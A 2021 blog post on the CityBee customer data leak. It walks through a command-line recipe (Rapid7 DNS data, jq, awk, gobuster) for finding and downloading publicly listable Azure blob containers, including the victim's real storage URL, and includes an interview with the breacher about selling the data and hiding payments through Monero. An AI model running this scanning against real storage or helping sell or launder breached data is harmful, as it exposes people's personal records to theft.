---
title: "Behind the scenes of CityBee customer data leak"
date: 2021-02-16T23:59:00+00:00
author: "Stnby"
---

## Introduction
All of this is obviously for educational and informative purpose. And I do not support any
sort of crime either.

All of the information below comes from the *researcher* himself from his interview and some of my own tests obviously. :D

Well what even is [CityBee](https://www.citybee.lt/en/) you may ask?\
It is a car, bike and scooter rental service in Lithuania.

**And oh yes they store some data** (can tell that just by looking at their homepage).

{{< figure src="2021-02-17_00-08.png" title="Homepage — citybee.lt" >}}

## Procedure (all the fun stuff)

### 1. Obtain some sort of a database for the DNS records
There are many other ways of finding the domain names from brute-force to Reverse DNS Lookups or even data on SSL certificates.

But in this case [Rapid7 Open Data Forward DNS (FDNS)](https://opendata.rapid7.com/sonar.fdns_v2/) was being used.

{{< figure src="Screenshot_2021-02-17 Rapid7 Open Data Forward DNS (FDNS).png" title="Rapid7 Open Data Forward DNS (FDNS)" >}}

```sh
wget https://opendata.rapid7.com/sonar.fdns_v2/2021-01-29-1611878713-fdns_cname.json.gz
gunzip 2021-01-29-1611878713-fdns_cname.json.gz
```


### 2. Cleaning / parsing the data

Let's clean them a bit with the help of common UNIX tools. (get rid of boring stuff)
```sh
jq -r '.value' 2021-01-29-1611878713-fdns_cname.json > cname.txt
sort -u cname.txt -o cname.txt
grep '\.blob\.core\.windows\.net' cname.txt > azure.txt
```

Now we should have a long list of domain names pointing to various Azure containers.

### 3. Running a directory scanner
With the help of a directory scanner we search for "container names".
But it is not that simple as we need some `GET` parameters.

| Method | Request URI                                                                       |
| :----: | --------------------------------------------------------------------------------- |
| `GET`  | `https://myaccount.blob.core.windows.net/mycontainer?restype=container&comp=list` |

> More on this: https://docs.microsoft.com/en-us/rest/api/storageservices/list-blobs

Append the `GET` parameters to our word-list.
```sh
awk '{print $0"?restype=container&comp=list";}' common.txt > common-params.txt
```

Using [Gobuster](https://github.com/OJ/gobuster) to find container name.
```
$ gobuster -q -w common-params.txt -u 'https://citybeeproductionlt.blob.core.windows.net/'
/sql?restype=container&comp=list (Status: 200)
```

> Note: No scan was preformed using Gobuster on the following domain.\
> It is only me showing the procedure with the help of tools I know.\
> The data breacher states that he had his own script to preform this exact step.

### 4. Download the files
Just open the following URI above in browser and everything else is self explanatory.\
All the file paths and URLs are visible in the XML response.

> Note: The file was called `CitybeeProduction.bacpac`

## So what data got leaked?
~110.000 customer's data which includes:
 * Email addresses;
 * Customer full names;
 * SHA-1 Password Hashes *(unsalted)*;
 * ID numbers;

The following data was leaked on forums.\
And the whole database is being sold.

```
Compromised tables:
dbo.Customers
dbo.Users
dbo.CreditCards
dbo._MigrationHistory
dbo.DriversLicenses
dbo.UserRoles
dbo.Companies
dbo.SettingsHistory
dbo.Discounts
dbo.RefreshTokens
dbo.Cars
dbo.DiscountCoupons
dbo.AssetParameters
dbo.AssetParametersHistory
dbo.CarsHistory
dbo.ParkingZones
dbo.Assets
dbo.ParkingZonesHistory
dbo.AssetParkingGroups
dbo.UserAvailableCoupons
dbo.AssetsHistory
dbo.lmages
dbo.Translations
dbo.ReservationsHistory
dbo.AssesedPricingintervals
dbo.Reservations
dbo.EnumTranslations
dbo.ParkingZoneGroups
dbo.Settings
dbo.WebActivities
dbo.AssetParameterValues
dbo.ServicePricings
dbo.PriceCalculationParameters
dbo.Services
dbo.Pricings
dbo.ParkingGroups
dbo.City
dbo.AssetParameterTypes
dbo.ParkingGroupsHistory
dbo.Tokens
dbo.Pricelistings
dbo.AssetParkingGroupsHistory
dbo.Roles
dbo.AssetParameterValuesHistory
dbo.WebActivityRoles
dbo.ParkingZoneGroupsHistory
dbo.Countries
```

## Questions & Answers
**I've seen some info about "your" talk with the officials or something is that real info?**\
— I've only talked to people on raidforums.

**So you are an experienced researcher yourself or just beginner who came across the database dump while scanning stuff?**\
— I'm experienced been coding for 5 years.

**When did you find the dump as It was made in 2018?**\
— I found it around a week ago.\
— I created a script that scans loads of companies.

**Did you target LT?**\
— Nope targets companies azure blobs and s3 buckets.

**Did you sell it to anyone yet?**\
— Sold to a couple of security researchers no bad actors :)

**Well do you call yourself white or black hat?**\
— I don't really call myself a hacker in the first place.\
— I don't really want to get into the profession of it just find it a easy money source.\
— Also hacking is not as hard as shown by some people.\
— Big companies have been hacked in the easiest ways.

**Why do you choose Bitcoin for payments?**\
— Bitcoin has no names.

**Yeah but I assume you know Bitcoin has a a public transaction history.**\
— Yeh I know I'm not worried about that.\
— Monero is what i use for things.\
— There's an exchange called kilos I send to two different Monero wallets.

**Do you just do stuff solo? Or have some kind of a team?**\
— All solo. Can't really talk about my team.

**Where did you take the DNS records from?**\
— https://opendata.rapid7.com/sonar.fdns_v2/ ;)

**Does Azure really list the files in a directory?**\
— Amazon S3 does. You have to brute-force for Azure.\
— Once you brute-force the directory you can see everything. (with correct `GET` parameters)

**Did many people come and ask questions to you on here?**\
— Lots. If I get caught I get caught theres people doing worse.

**What VPS do you use?**\
— A vps in Russia. Russia doesn't care as long as it doesn't go against them.
